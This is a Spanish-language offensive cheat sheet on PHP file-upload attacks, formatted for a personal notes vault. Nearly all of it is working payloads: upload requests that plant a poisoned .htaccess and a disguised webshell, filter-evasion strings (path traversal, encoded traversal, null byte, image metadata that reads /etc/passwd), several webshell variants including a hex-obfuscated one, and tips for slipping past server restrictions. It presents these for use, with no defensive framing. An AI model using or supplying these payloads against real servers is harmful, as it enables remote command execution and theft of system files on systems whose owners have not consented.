
---

#### 🚀 **1. .htaccess Poisoning**
Aprovechamiento de archivos `.htaccess` para ejecutar código PHP en servidores mal configurados.

**Paso 1: Subida del archivo .htaccess**
```php
Content-Disposition: form-data; name="fileToUpload"; filename=".htaccess" 
Content-Type: text/plain

AddType application/x-httpd-php .test 
```

**Paso 2: Subida de un archivo PHP disfrazado**
```php
Content-Disposition: form-data; name="fileToUpload"; filename="cmd.test" 
Content-Type: application/x-php

<?php
    system($_GET['cmd']);
?>
```

---

#### 🕵️‍♂️ **2. Técnicas de Evasión en la Subida**
Burlando filtros de extensión y nombre de archivo:

- **Path Traversal:**  
  ```bash
  ../shell.php
  ```
- **Caracteres de Codificación:**  
  ```bash
  %2e%2e%2fshell.php
  ```
- **Null Byte Injection:**  
  ```bash
  shell.php%00.jpg
  ```
- **Metadatos en Imágenes (Exiftool):**  
  ```bash
  exiftool -comment="<?php echo 'LOOK HERE' . file_get_contents('/etc/passwd'); ?>" background.png
  ```
  
---

#### 🐚 **3. Webshells en PHP** 💻
Diversos métodos para obtener ejecución remota de comandos:

- **Webshell simple con backticks (`):**  
  ```php
  <?=`$_GET[0]`?>
  ```
- **Webshell clásico con `system`:**  
  ```php
  <?php
      $c = $_GET['cmd'];
      echo `$c`;
  ?>
  ```
- **Ejecución directa con `system()`:**  
  ```php
  <?php
      "system"("id");
  ?>
  ```
- **Ejecución con encoding hexadecimal (obfuscación):**  
  ```php
  <?php
      "\x73\x79\x73\x74\x65\x6d"($_GET['cmd']);
  ?>
  ```

---

#### 🎯 **Consejos de Uso:**
- **Verifica siempre la extensión permitida** en el servidor.  
- **Prueba múltiples combinaciones de extensión y nombre** para evadir restricciones.  
- **Aprovecha los filtros de contenido mal configurados**.  
- **Cambia el tipo de contenido y la codificación** para ver si el servidor lo interpreta como PHP.  

---

💡 ¡Guarda este cheat sheet en tu Obsidian para tenerlo siempre a mano! 💥